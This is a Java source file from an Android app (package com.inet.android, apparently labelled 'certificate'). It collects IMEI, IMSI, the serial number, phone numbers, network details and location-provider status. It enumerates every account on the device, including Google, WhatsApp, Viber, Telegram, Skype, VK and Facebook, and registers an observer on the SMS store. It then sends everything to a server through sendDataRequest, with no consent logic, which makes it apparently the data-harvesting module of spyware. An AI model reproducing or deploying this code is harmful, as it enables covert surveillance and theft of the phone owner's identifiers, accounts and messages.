package com.inet.android.info;

import java.lang.reflect.Method;
import java.text.NumberFormat;
import java.util.Locale;
import java.util.TimeZone;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Environment;
import android.os.StatFs;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import com.inet.android.certificate.R;
import com.inet.android.request.RequestList;
import com.inet.android.sms.SMSBroadcastReceiver;
import com.inet.android.sms.SmsSentObserver;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

public class GetInfo {
	static Context mContext;
	static SharedPreferences sp;
	static Editor e;
	static TelephonyManager telephonyManager;
	static int networkType;
	TelephonyInfo telephonyInfo;
	private String LOG_TAG = "GetIfo";
	String typeStr = "1";
	SMSBroadcastReceiver sms;
	JSONObject info;
	Resources path;

	public GetInfo(Context mContext) {
		GetInfo.mContext = mContext;
	}

	public void startGetInfo() {
		contentObserved();
		path = mContext.getApplicationContext().getResources();

		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		telephonyManager = (TelephonyManager) mContext
				.getSystemService(Context.TELEPHONY_SERVICE);
		telephonyInfo = TelephonyInfo.getInstance(mContext);

		// -------initial json line----------------------
		String sendJSONStr = null;
		JSONObject jsonObject = new JSONObject();
		JSONArray data = new JSONArray();

		info = new JSONObject();
		JSONObject object = new JSONObject();
		try {
			info.put("app", sp.getString("BUILD", "V_000.1"));
			info.put(path.getString(R.string.manufactured), getManufactured());
			info.put(path.getString(R.string.product), getProduct());
			info.put(path.getString(R.string.brand), getBrand());
			info.put(path.getString(R.string.model), getModel());
			info.put("os_version", getVerAndroid());
			info.put("SDK", getSDK());
			info.put("IMSI", getIMSI());
			info.put(path.getString(R.string.serial_number), getSerialNum());
			getFeatures();
			info.put(path.getString(R.string.display_size), getDisplayInfo());
			info.put(path.getString(R.string.sd), getSDCardReady());
			info.put("operator_name", getOperatorName());
			info.put(path.getString(R.string.phone_type), getPhoneType());
			info.put(path.getString(R.string.time_zone), getTimeZone());
			info.put(path.getString(R.string.locale), Locale.getDefault().getDisplayLanguage());
			info.put("IMEI SIM", getIMEISim1());

			if (getIsDualSIM() == true) {
				info.put("IMEI SIM2", getIMEISim2());
				info.put(path.getString(R.string.dual_sim),
						path.getString(R.string.available));
			}
			if (getNumber() != null)
				info.put("number", getNumber());
			// else if (getAccaunt() != null)
			// info.put("number", getAccaunt());

			info.put("MCC", getMCC());
			info.put("MNC", getMNC());
			info.put(path.getString(R.string.network_type), getNetworkType());
			info.put(path.getString(R.string.connect_type), getConnectType());
			getAccaunt();

			object.put("time", ConvertDate.logTime());
			object.put("type", typeStr);
			object.put("info", info);
			// object.put("hardware", value);
			// object.put("accaunt", value);
			// object.put("net", value);

			data.put(object);
			jsonObject.put("data", data);
			sendJSONStr = object.toString();
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "json ñëîìàëñÿ", "json ñëîìàëñÿ");
		}
		if (sendJSONStr != null) {
			RequestList.sendDataRequest(object.toString(), mContext);
			Logging.doLog(LOG_TAG, sendJSONStr);
		}
	}

	/**
	 * get getSimOperatorName
	 * 
	 * @return
	 */
	public String getSimOperatorName() {
		String operatorName;
		try {
			operatorName = telephonyManager.getSimOperatorName();
		} catch (Exception e) {
			e.printStackTrace();
			operatorName = "0";
		}
		return operatorName;
	}

	/**
	 * get getBrand
	 * 
	 * @return
	 */
	private String getBrand() {
		String brand;
		try {
			brand = android.os.Build.BRAND;
		} catch (Exception e) {
			e.printStackTrace();
			brand = "0";
		}
		return brand;
	}

	/**
	 * get getSDK
	 * 
	 * @return
	 */
	private String getSDK() {
		String SDK;
		try {
			SDK = Integer.toString(android.os.Build.VERSION.SDK_INT);
		} catch (Exception e) {
			e.printStackTrace();
			SDK = "0";
		}
		return SDK;
	}

	/**
	 * get getOperatorName
	 * 
	 * @return
	 */
	private String getOperatorName() {
		String operatorName = null;
		try {
			operatorName = telephonyManager.getNetworkOperatorName();
		} catch (Exception e) {
			e.printStackTrace();
			operatorName = "0";
		}
		return operatorName;
	}

	/**
	 * getIMSI
	 * 
	 * @return
	 */

	private String getIMSI() {
		String sIMSI = null;
		try {
			sIMSI = telephonyManager.getSubscriberId();
		} catch (Exception e) {
			e.printStackTrace();
			sIMSI = "0";
		}
		return sIMSI;

	}

	/**
	 * getVersion Android
	 * 
	 * @return
	 */
	private String getVerAndroid() {
		String verAndroid = null;
		try {
			verAndroid = android.os.Build.VERSION.RELEASE;
		} catch (Exception e) {
			e.printStackTrace();
			verAndroid = "0";
		}
		return verAndroid;

	}

	/**
	 * getManufactured
	 * 
	 * @return
	 */

	private String getManufactured() {
		String manufactured = null;
		try {
			manufactured = android.os.Build.MANUFACTURER;
		} catch (Exception e) {
			e.printStackTrace();
			manufactured = "0";
		}
		return manufactured;

	}

	/**
	 * getProduct
	 * 
	 * @return
	 */
	public String getProduct() {
		String product = null;
		try {
			product = android.os.Build.PRODUCT;
		} catch (Exception e) {
			e.printStackTrace();
			product = "0";
		}
		return product;

	}

	/**
	 * getModel
	 * 
	 * @return
	 */
	private String getModel() {
		String model = null;
		try {
			model = android.os.Build.MODEL;
		} catch (Exception e) {
			e.printStackTrace();
			model = "0";
		}
		return model;

	}

	/**
	 * getSerialNumber
	 * 
	 * @return
	 */
	private String getSerialNum() {
		String serialnum = null;

		try {
			Class<?> c = Class.forName("android.os.SystemProperties");
			Method get = c.getMethod("get", String.class, String.class);
			serialnum = (String) (get.invoke(c, "ro.serialno", "unknown"));
		} catch (Exception e) {
			e.printStackTrace();
		}
		return serialnum;
	}

	/**
	 * get PhoneType
	 * 
	 * @return
	 */
	private String getPhoneType() {
		int phoneType = telephonyManager.getPhoneType();
		String phoneTypeName = null;
		switch (phoneType) {
		case (TelephonyManager.PHONE_TYPE_CDMA):
			phoneTypeName = "CDMA";
			break;
		case (TelephonyManager.PHONE_TYPE_GSM):
			phoneTypeName = "GSM";
			break;
		case (TelephonyManager.PHONE_TYPE_NONE):
			phoneTypeName = "NONE";
			break;
		default:
			break;
		}
		return phoneTypeName;
	}

	/**
	 * get NetworkType
	 * 
	 * @return
	 */
	private String getNetworkType() {
		networkType = telephonyManager.getNetworkType();
		switch (networkType) {
		case TelephonyManager.NETWORK_TYPE_1xRTT:
			return "1xRTT";
		case TelephonyManager.NETWORK_TYPE_CDMA:
			return "CDMA";
		case TelephonyManager.NETWORK_TYPE_EDGE:
			return "EDGE";
		case TelephonyManager.NETWORK_TYPE_EHRPD:
			return "eHRPD";
		case TelephonyManager.NETWORK_TYPE_EVDO_0:
			return "EVDO rev. 0";
		case TelephonyManager.NETWORK_TYPE_EVDO_A:
			return "EVDO rev. A";
		case TelephonyManager.NETWORK_TYPE_EVDO_B:
			return "EVDO rev. B";
		case TelephonyManager.NETWORK_TYPE_GPRS:
			return "GPRS";
		case TelephonyManager.NETWORK_TYPE_HSDPA:
			return "HSDPA";
		case TelephonyManager.NETWORK_TYPE_HSPA:
			return "HSPA";
		case TelephonyManager.NETWORK_TYPE_HSPAP:
			return "HSPA+";
		case TelephonyManager.NETWORK_TYPE_HSUPA:
			return "HSUPA";
		case TelephonyManager.NETWORK_TYPE_IDEN:
			return "iDen";
		case TelephonyManager.NETWORK_TYPE_LTE:
			return "LTE";
		case TelephonyManager.NETWORK_TYPE_UMTS:
			return "UMTS";
		case TelephonyManager.NETWORK_TYPE_UNKNOWN:
			return "0";
		}
		throw new RuntimeException("New type of network");
	}

	/**
	 * getConnectType
	 * 
	 * @return
	 */
	private String getConnectType() {

		String network = "";
		final ConnectivityManager cm = (ConnectivityManager) mContext
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		try {
			if (cm.getActiveNetworkInfo().getType() == ConnectivityManager.TYPE_MOBILE)
				network = "Cell Network/3G";
			else if (cm.getActiveNetworkInfo().getType() == ConnectivityManager.TYPE_WIFI)
				network = "Wi-Fi";
			else
				network = "N/A";
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return network;
	}

	/**
	 * getIMEISim1
	 * 
	 * @return
	 */

	private String getIMEISim1() {
		String sIMEISim1 = null;
		try {
			sIMEISim1 = telephonyInfo.getImeiSIM1();
		} catch (Exception e) {
			e.printStackTrace();
			sIMEISim1 = "0";
		}
		return sIMEISim1;

	}

	/**
	 * getIMEISim2
	 * 
	 * @return
	 */

	private String getIMEISim2() {
		String sIMEISim2 = null;
		try {
			sIMEISim2 = telephonyInfo.getImeiSIM2();
		} catch (Exception e) {
			e.printStackTrace();
			sIMEISim2 = "0";
		}
		return sIMEISim2;
	}

	/**
	 * getIsDualSim
	 * 
	 * @return
	 */
	private Boolean getIsDualSIM() {
		Boolean sIsDualSim = null;
		try {
			sIsDualSim = telephonyInfo.isDualSIM();
		} catch (Exception e) {
			e.printStackTrace();
			sIsDualSim = false;
		}
		return sIsDualSim;

	}

	/**
	 * getNumber
	 * 
	 * @return
	 */
	private String getNumber() {
		String number = null;
		try {
			number = telephonyInfo.getNumber();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return number;

	}

	/**
	 * getAccaunt
	 * 
	 * 
	 */
	private void getAccaunt() {
		String accauntGoogle = null;

		AccountManager am = AccountManager.get(mContext);
		Account[] accounts = am.getAccounts();
		String phoneNumber = null;

		for (Account ac : accounts) {
			String acname = ac.name;
			String actype = ac.type;
			// Take your time to look at all available accounts
			System.out.println("Accounts : " + acname + ", " + actype);
			if (actype.equals("com.google")) {
				if (accauntGoogle == null)
					accauntGoogle = acname;
				else
					accauntGoogle += ", " + acname;
			} else if (actype.equals("com.whatsapp")) {

				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
					String number = acname.replace(" ", "");
					if (number.indexOf("7") == 0) {
						number = "+" + number;
					}
					if (phoneNumber != null) {
						if (!phoneNumber.equals(number)) {
							phoneNumber = " " + number;
						}
					} else
						phoneNumber = number;

					try {
						info.put("WhatsApp", phoneNumber);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			} else if (actype.equals("com.viber.voip.account")) {
				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
					String number = acname.replace(" ", "");
					if (number.indexOf("7") == 0) {
						number = "+" + number;
					}
					if (phoneNumber != null) {
						if (!phoneNumber.equals(number)) {
							phoneNumber += " " + number;
						}
					} else
						phoneNumber = number;

					try {
						info.put("Viber", acname);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

				}
			} else if (actype.equals("com.icq.mobile.client")) {
				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
					String number = acname.replace(" ", "");
					if (number.indexOf("7") == 0) {
						number = "+" + number;
					}
					if (phoneNumber != null) {
						if (!phoneNumber.equals(number)) {
							phoneNumber += " " + number;
						}
					} else
						phoneNumber = number;

					try {
						info.put("ICQ", acname);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			} else if (actype.equals("org.telegram.account")) {
				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
					String number = acname.replace(" ", "");
					if (number.indexOf("7") == 0) {
						number = "+" + number;
					}

					if (phoneNumber != null) {
						if (!phoneNumber.equals(number)) {
							phoneNumber += " " + number;
						}
					} else
						phoneNumber = number;

					try {
						info.put("Telegram", acname);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			} else if (actype.equals("com.skype.contacts.sync")) {
				try {
					info.put("Skype", acname);
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} else if (actype.equals("com.vkontakte.account")) {
				try {
					info.put("Vkontakte", acname);
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} else if (actype.equals("com.facebook.auth.login")) {
				try {
					info.put("Facebook", acname);
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} else {
				try {
					info.put(actype, acname);
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
		try {
			if (accauntGoogle != null)
				info.put("Google", accauntGoogle);
			if (phoneNumber != null)
				info.put("number", phoneNumber);
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * getMCC
	 * 
	 * @return
	 */
	private String getMCC() {
		String networkOperator = telephonyManager.getNetworkOperator();
		String mcc = null;
		try {
			if (networkOperator != null) {
				mcc = networkOperator.substring(0, 3);

			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return mcc;

	}

	/**
	 * getMCC
	 * 
	 * @return
	 */
	private String getMNC() {
		String networkOperator = telephonyManager.getNetworkOperator();
		String mnc = null;
		try {
			if (networkOperator != null) {
				mnc = networkOperator.substring(3);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return mnc;

	}

	/**
	 * getDisplayMetrics w*h
	 * 
	 * @return
	 */
	private String getDisplayInfo() {
		WindowManager wm = (WindowManager) mContext
				.getSystemService(Context.WINDOW_SERVICE);
		// Best way for new devices
		DisplayMetrics displayMetrics = new DisplayMetrics();
		wm.getDefaultDisplay().getMetrics(displayMetrics);
		String str_ScreenSize = displayMetrics.widthPixels + " x "
				+ displayMetrics.heightPixels;
		return str_ScreenSize;
	}

	private String getSDCardReady() {
		String SD = null;
		StatFs stats;
		// the total size of the SD card
		double totalSize;
		// the available free space
		double freeSpace;
		// a String to store the SD card information
		String totalSpace;
		String RemainingSpace;

		// set the number format output
		NumberFormat numberFormat;

		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED))
			SD = path.getString(R.string.mounted);
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_REMOVED))
			SD = path.getString(R.string.removed);
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_CHECKING))
			SD = path.getString(R.string.checking);
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_UNMOUNTED))
			SD = path.getString(R.string.unmounted);
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_BAD_REMOVAL))
			SD = path.getString(R.string.bad_removal);
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED_READ_ONLY))
			SD = path.getString(R.string.mounted_read_only);
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_NOFS))
			SD = path.getString(R.string.unsupported_filesystem);
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_SHARED))
			SD = path.getString(R.string.shared);
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_UNMOUNTABLE))
			SD = path.getString(R.string.cannot_be_mounted);
		if (SD.equals("Mounted") || SD.equals("Unmounted")
				|| SD.equals("Mounted read only")) {
			// obtain the stats from the root of the SD card.
			stats = new StatFs(Environment.getExternalStorageDirectory()
					.getAbsolutePath());

			// Add 'Total Size' to the output string:
			// total usable size
			totalSize = (long) stats.getBlockCount()
					* (long) stats.getBlockSize();

			// initialize the NumberFormat object
			numberFormat = NumberFormat.getInstance();
			// disable grouping
			numberFormat.setGroupingUsed(false);
			// display numbers with two decimal places
			numberFormat.setMaximumFractionDigits(2);

			// Output the SD card's total size in gigabytes, megabytes,
			// kilobytes and bytes 280
			totalSpace = numberFormat.format((totalSize / 1073741824))
					+ " GB \n";

			// Add 'Remaining Space' to the output string:
			// available free space
			freeSpace = (long) stats.getAvailableBlocks()
					* (long) stats.getBlockSize();
			// Output the SD card's available free space in gigabytes,
			// megabytes, kilobytes and bytes
			RemainingSpace = numberFormat.format(freeSpace / 1073741824)
					+ " GB \n";
			try {
				info.put(path.getString(R.string.total_size), totalSpace);
				info.put(path.getString(R.string.remaining_size),
						RemainingSpace);

			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return SD;
	}

	private String getTimeZone() {
		String timeZone;
		TimeZone tz = TimeZone.getDefault();
		timeZone = tz.getDisplayName(false, TimeZone.SHORT) + ", " + tz.getID();
		return timeZone;
	}

	private void getFeatures() {
		PackageManager pm = mContext.getPackageManager();
		String GPS;
		String LocationStatus;
		String USBHost;
		String WiFi;
		String microphone;
		String network;
		if (pm.hasSystemFeature(PackageManager.FEATURE_LOCATION_GPS) == true)
			GPS = path.getString(R.string.available);
		else
			GPS = path.getString(R.string.not_available);
		if (pm.hasSystemFeature(PackageManager.FEATURE_LOCATION_NETWORK) == true)
			network = path.getString(R.string.available);
		else
			network = path.getString(R.string.not_available);
		String provider = Settings.Secure.getString(
				mContext.getContentResolver(),
				Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
		if (!provider.equals("")) {
			// GPS Enabled
			LocationStatus = provider;
		} else {
			LocationStatus = "";
		}
		if (pm.hasSystemFeature(PackageManager.FEATURE_USB_HOST) == true)
			USBHost = path.getString(R.string.available);
		else
			USBHost = path.getString(R.string.not_available);
		if (pm.hasSystemFeature(PackageManager.FEATURE_WIFI) == true)
			WiFi = path.getString(R.string.available);
		else
			WiFi = path.getString(R.string.not_available);
		if (pm.hasSystemFeature(PackageManager.FEATURE_MICROPHONE) == true)
			microphone = path.getString(R.string.available);
		else
			microphone = path.getString(R.string.not_available);
		try {
			if (!LocationStatus.equals(""))
				info.put(path.getString(R.string.determine_the_coordinates),
						LocationStatus);
			info.put(path.getString(R.string.status_gps), GPS);
			info.put(path.getString(R.string.coordinates_cell_tower), network);
			info.put("Wi-Fi", WiFi);
			info.put(path.getString(R.string.microphone), microphone);
			info.put("USBHost", USBHost);
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void contentObserved() {
		SmsSentObserver observer = new SmsSentObserver(null);
		observer.setContext(mContext);
		mContext.getContentResolver().registerContentObserver(
				Uri.parse("content://sms"), true, observer);
	}
}